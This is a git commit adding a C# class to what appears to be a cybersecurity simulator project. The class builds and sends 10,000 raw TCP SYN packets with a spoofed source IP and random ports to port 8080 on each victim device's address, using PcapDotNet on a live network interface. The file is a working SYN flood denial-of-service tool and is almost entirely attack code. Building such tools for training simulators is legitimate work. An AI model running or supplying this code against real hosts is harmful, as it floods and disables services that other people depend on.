90ecbd4c2d2191ea16a7ba75641080327eb0cbe9
collapse2017 <p3collapse@gmail.com>
2018-04-02 15:23:07 -0400

    Attack Factory initial commit.

---
+++ PDA Cyber Security Simulator V1/SynFloodAttack.cs
@@ -0,0 +1,150 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+using PcapDotNet.Base;
+using PcapDotNet.Core;
+using PcapDotNet.Packets;
+using PcapDotNet.Packets.Arp;
+using PcapDotNet.Packets.Dns;
+using PcapDotNet.Packets.Ethernet;
+using PcapDotNet.Packets.Gre;
+using PcapDotNet.Packets.Http;
+using PcapDotNet.Packets.Icmp;
+using PcapDotNet.Packets.Igmp;
+using PcapDotNet.Packets.IpV4;
+using PcapDotNet.Packets.IpV6;
+using PcapDotNet.Packets.Transport;
+using PDA_Cyber_Security_Simulator_Domain;
+
+namespace PDA_Cyber_Security_Simulator_V1
+{
+    /* 
+    Links I found for help
+    https://msdn.microsoft.com/en-us/library/system.bitconverter(v=vs.110).aspx
+    https://msdn.microsoft.com/library/system.net.ipaddress
+    https://msdn.microsoft.com/en-us/library/system.net.socketaddress(v=vs.110).aspx
+    https://msdn.microsoft.com/en-us/library/system.net.endpoint(v=vs.110).aspx
+    https://msdn.microsoft.com/en-us/library/eae4f5y0(v=vs.110).aspx
+    https://msdn.microsoft.com/en-us/library/system.net.ipaddress(v=vs.110).aspx
+    https://stackoverflow.com/questions/2850815/what-is-the-inet-addr-function-equivalent-in-c-sharp
+    syn flood in C
+    https://www.binarytides.com/syn-flood-dos-attack/
+    */
+    class SynFloodAttack : IAttack
+    {
+        private Network Victim { get; }
+
+        public SynFloodAttack(Network vict)
+        {
+            Victim = vict;
+        }
+
+        static void MainSynFlood(string victimAddress)
+        {
+            Random rand = new Random((int)DateTime.Now.Ticks);
+            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
+
+            if (allDevices.Count == 0)
+            {
+                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
+                return;
+            }
+
+            // Print the list
+            for (int i = 0; i != allDevices.Count; ++i)
+            {
+                LivePacketDevice device = allDevices[i];
+                Console.Write((i + 1) + ". " + device.Name);
+                if (device.Description != null)
+                    Console.WriteLine(" (" + device.Description + ")");
+                else
+                    Console.WriteLine(" (No description available)");
+            }
+
+            int deviceIndex = 0;
+            do
+            {
+                Console.WriteLine("Enter the interface number (1-" + allDevices.Count + "):");
+                string deviceIndexString = Console.ReadLine();
+                if (!int.TryParse(deviceIndexString, out deviceIndex) ||
+                    deviceIndex < 1 || deviceIndex > allDevices.Count)
+                {
+                    deviceIndex = 0;
+                }
+            } while (deviceIndex == 0);
+
+            // Take the selected adapter
+            PacketDevice selectedDevice = allDevices[deviceIndex - 1];
+
+            // Open the output device
+            using (PacketCommunicator communicator = selectedDevice.Open(100, // name of the device
+                                                                         PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
+                                                                         1000)) // read timeout
+            {
+                // Supposing to be on ethernet, set mac source to 01:01:01:01:01:01
+                MacAddress source = new MacAddress("01:01:01:01:01:01");
+
+                // set mac destination to 02:02:02:02:02:02
+                MacAddress destination = new MacAddress("02:02:02:02:02:02");
+
+                // Create the packets layers
+
+                // Ethernet Layer
+                EthernetLayer ethernetLayer = new EthernetLayer
+                {
+                    Source = source,
+                    Destination = destination
+                };
+
+                // IPv4 Layer
+                IpV4Layer ipV4Layer = new IpV4Layer
+                {
+                    Source = new IpV4Address("1.2.3.4"),
+                    Ttl = 128,
+                    // The rest of the important parameters will be set for each packet
+                };
+
+                // TCP LAYER
+                TcpLayer tcpLayer = new TcpLayer
+                {
+                    ControlBits = TcpControlBits.Synchronize
+                };
+
+                // Create the builder that will build our packets
+                PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer);
+
+                // Send 100 Pings to different destination with different parameters
+                for (int i = 0; i != 10000; ++i)
+                {
+                    // Set IPv4 parameters
+                    // ipV4Layer.CurrentDestination = victimAddress;
+                    ipV4Layer.CurrentDestination = new IpV4Address(victimAddress);
+                    ipV4Layer.Identification = (ushort)i;
+
+                    // Set TCP parameters
+                    tcpLayer.SourcePort = (ushort)(rand.Next(0, 1000) + 33000);
+                    tcpLayer.DestinationPort = (ushort)8080;
+
+                    // Build the packet
+                    Packet packet = builder.Build(DateTime.Now);
+
+                    // Send down the packet
+                    communicator.SendPacket(packet);
+                }
+            }
+
+        }
+
+        public void StartAttack()
+        {
+            for (int i = 0; i < Victim.Devices.Count; i++)
+            {
+                SynFloodAttack.MainSynFlood(Victim.Devices[i].IpAddress);
+            }
+        }
+    }
+}
